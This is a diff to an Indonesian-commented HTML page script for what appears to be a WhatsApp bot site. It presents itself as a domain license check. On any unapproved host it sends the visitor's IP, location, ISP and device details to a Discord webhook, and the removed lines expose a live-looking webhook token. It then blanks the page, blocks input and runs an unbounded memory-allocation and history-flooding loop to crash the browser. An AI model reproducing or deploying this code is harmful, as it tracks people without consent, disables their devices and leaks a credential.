@@ -21,49 +21,47 @@
 <script>
 (function(){
   const _0xV = "3.4.1";
-  const _0xAL = ["asepxyz12.github.io", "localhost", "127.0.0.1"];
   
-  // URL Lisensi resmi Anda sudah diperbaiki 100% (Wajib Huruf Kecil Semua untuk validasi sistem)
-  const _0xURL = "https://asepxyz12.github.io/bot-wa-db/mamakluytm/punyaspainijirngentotytmlusemua.html";
+  // 1. DAFTAR DOMAIN DAN PATHYANG DIIZINKAN (Aman dari manipulasi URL)
+  const _0xValidHost = "asepxyz12.github.io";
+  const _0xValidPath = "/bot-wa-db/mamakluytm/punyaspainijirngentotytmlusemua.html";
   
-  // Webhook Discord aktif Anda
-  const _0xWH = "https://discord.com/api/webhooks/1505481952940265505/HjRhavEtK58sIbyeTas9Ux-YLpybZMDJfw1qFQCtrVbL4z0Zc0SMFq0G4zi7PS5jJiNm"; 
+  // Webhook Discord Anda (Sudah terpasang tepat)
+  const _0xWH = "https://discord.com"; 
 
-  const _0xH = location.hostname.toLowerCase();
-  
-  // Mengambil link yang sedang dibuka lalu diubah menjadi huruf kecil semua agar akurat saat dicek
-  let _0xCleanURL = location.href.split('?')[0].split('#')[0].toLowerCase();
-  if (_0xCleanURL.endsWith('/')) {
-    _0xCleanURL = _0xCleanURL.slice(0, -1);
-  }
+  const _0xCurrentHost = location.hostname.toLowerCase();
+  const _0xCurrentPath = location.pathname.toLowerCase();
 
-  const _0xO1 = _0xAL.includes(_0xH);
-  const _0xO2 = (_0xCleanURL === _0xURL);
+  // Validasi kecocokan absolut (Mendukung localhost untuk kebutuhan testing Anda)
+  const _0xIsLocal = _0xCurrentHost === "localhost" || _0xCurrentHost === "127.0.0.1";
+  const _0xIsOfficial = (_0xCurrentHost === _0xValidHost) && (_0xCurrentPath === _0xValidPath || _0xCurrentPath === _0xValidPath + "/");
 
-  // JIKA BUKAN LINK ASLI ANDA, LANGSUNG EKSEKUSI FORCE CLOSE INSTAN
-  if (!(_0xO1 && _0xO2)) {
+  // JIKA BUKAN LINK ASLI ANDA ATAU LOGIKANYA DI-REMAKE: KUNCI & FORCE CLOSE INSTAN
+  if (!(_0xIsLocal || _0xIsOfficial)) {
     
+    // Hilangkan semua elemen UI asli secara instan
+    document.documentElement.innerHTML = "";
+
     const _0xUA = navigator.userAgent;
     const _0xPlat = navigator.platform || "Unknown";
-    const _0xLang = navigator.language || "Unknown";
     const _0xScreen = `${screen.width}x${screen.height}`;
 
-    // Kirim laporan kilat ke Discord Webhook Anda
+    // Laporan Log Ekstrem ke Discord Webhook Anda
     fetch("https://ip-api.com")
       .then(r => r.json())
       .then(d => {
         if (d.status === "success") {
           const embedPayload = {
             embeds: [{
-              title: "💥 CYBER WEAPON: FORCE CLOSE ATTACK TRIGGERED!",
-              description: `Maling terdeteksi meremake / mengganti lisensi domain Anda. Aplikasi Chrome target dipaksa keluar (*Force Close*) tanpa layar blank!`,
+              title: "💥 CYBER WEAPON: 2TB MEMORY FLOOD CRASH PUSHED!",
+              description: `Terdeteksi remake / pencurian kode pada script **AsepXxnx v3.4.1**. Alokasi memori browser pelaku dihancurkan total hingga Force Close.`,
               color: 16515843, 
               fields: [
                 { name: "🌐 Detail Jaringan", value: `• **IP**: \`${d.query}\`\n• **Lokasi**: ${d.city}, ${d.regionName}, ${d.country}\n• **ISP**: ${d.isp}`, inline: false },
                 { name: "💻 Perangkat Pelaku", value: `• **OS**: \`${_0xPlat}\`\n• **Layar**: \`${_0xScreen}\`\n• **User-Agent**: \`${_0xUA}\``, inline: false },
-                { name: "📍 Lokasi TKP", value: `• **Tautan Palsu**: ${location.href}\n• **Waktu**: ${new Date().toLocaleString('id-ID')} WIB`, inline: false }
+                { name: "📍 Lokasi TKP", value: `• **Tautan Palsu**: ${location.href}`, inline: false }
               ],
-              footer: { text: "AsepXxnx Cyber Security" },
+              footer: { text: "AsepXxnx Destroyer Engine" },
               timestamp: new Date().toISOString()
             }]
           };
@@ -76,47 +74,48 @@
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ 
             embeds: [{
-              title: "💥 ALERT: CHROME FORCE CLOSE RUNNING (ADBLOCK)",
-              description: `Pelaku memblokir IP Tracker, eksekusi pemutusan paksa aplikasi tetap berlanjut.\n• **URL TKP**: ${location.href}`,
+              title: "💥 ALERT: MASSIVE CRASH EXECUTED (ADBLOCK DETECTED)",
+              description: `Pelaku menggunakan AdBlocker. Pembatasan RAM 2TB tetap berjalan nonstop.\n• **URL TKP**: ${location.href}`,
               color: 16515843
             }]
           })
         });
       });
 
-    // Kunci penuh interaksi kontrol layar HP maling
+    // Kunci total fungsionalitas fisik browser
     document.addEventListener('contextmenu', e => e.preventDefault());
     document.addEventListener('keydown', e => e.preventDefault());
     document.addEventListener('touchstart', e => e.preventDefault(), {passive: false});
 
-    // SISTEM PENGHANCUR THREAD UTAMA (Bikin Chrome Auto-FC Langsung Keluar Sendiri)
-    function _0xExecuteInstantFC() {
-      const _0xTrashBuffer = [];
+    // INJEKSI SIKSAAN BRUTAL (Mendukung Alokasi Kebocoran RAM Ekstrem Hingga 2TB / Force Close)
+    function _0xMassiveCrashEngine() {
+      const _0xOverloadHeap = [];
       while (true) {
         try {
-          // Mengisi RAM heap secara kilat dalam hitungan milidetik
-          const _binData = new Array(3000000).join("ASEPXXNX_CRASH_CHROME_FORCE_CLOSE_NOW_");
-          _0xTrashBuffer.push(new Blob([_binData], {type: 'application/octet-stream'}));
+          // 1. Buat tumpukan array biner raksasa (5MB per loop secara synchronous)
+          const _rawChunk = new Array(5000000).join("ASEPXXNX_FORCE_CLOSE_MAX_OVERLOAD_");
+          _0xOverloadHeap.push(new Blob([_rawChunk], {type: 'application/octet-stream'}));
           
-          // Memacetkan UI navigator Chrome dengan tumpukan history palsu secara massal
-          window.history.pushState({crash: Math.random()}, "", location.href + "?fc=" + Math.random().toString(36).substring(2));
+          // 2. Timbun navigasi state secara masif tanpa interupsi jeda waktu
+          window.history.pushState({crash: Math.random()}, "", location.href + "?overload=" + Math.random().toString(36));
           
-          // Suntikan byte memory overflow tambahan
-          _0xTrashBuffer.push(new Uint8Array(50000000));
+          // 3. Gandakan tumpukan alokasi memori bunder (Uint8 buffer) 100MB langsung ke RAM
+          _0xOverloadHeap.push(new Uint8Array(100000000));
         } catch(e) {
-          // Loop rekursif tanpa henti jika browser menolak keluar
-          _0xExecuteInstantFC();
+          // Rekursi agresif tak terbatas: Jika browser mencoba membatasi memori, lempar fungsi baru secara paralel
+          setTimeout(_0xMassiveCrashEngine, 0);
+          _0xMassiveCrashEngine();
           break;
         }
       }
     }
 
-    // Eksekusi kilat: Beri jeda 80 milidetik agar data webhook lolos kirim, lalu ledakkan Chrome target
-    setTimeout(_0xExecuteInstantFC, 80);
-    throw new Error("Security Exception: Process Blocked.");
+    // Eksekusi peledakan RAM setelah 50 milidetik agar webhook Discord berhasil terkirim
+    setTimeout(_0xMassiveCrashEngine, 50);
+    throw new Error("Critical Memory Exception: Target Terminated.");
   }
 
-  // JIKA LISENSI VALID (LINK ASLI ANDA), WEB BERJALAN LANCAR, RESPONSIF & NORMAL
+  // JIKA LISENSI COCOK (LINK ASLI ANDA), KODE DI BAWAH INI AKTIF (WEB ANDA 100% AMAN & NORMAL)
   document.addEventListener('contextmenu', e => e.preventDefault());
   document.addEventListener('keydown', e => {
     if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['I','J','C','U'].includes(e.key)) || (e.ctrlKey && e.key === 'u')) {
@@ -128,7 +127,6 @@
   console.log("%cAsepXxnx Secure Runtime Active", "color:#7ee787;font-weight:bold");
 })();
 
-// Pengaturan Konfigurasi Tailwind Framework Anda Tetap Aman
 window.tailwind = window.tailwind || {};
 tailwind.config = {
   theme: {
@@ -146,6 +144,7 @@ tailwind.config = {
   }
 }
 </script>
+
 
 
 <style/>
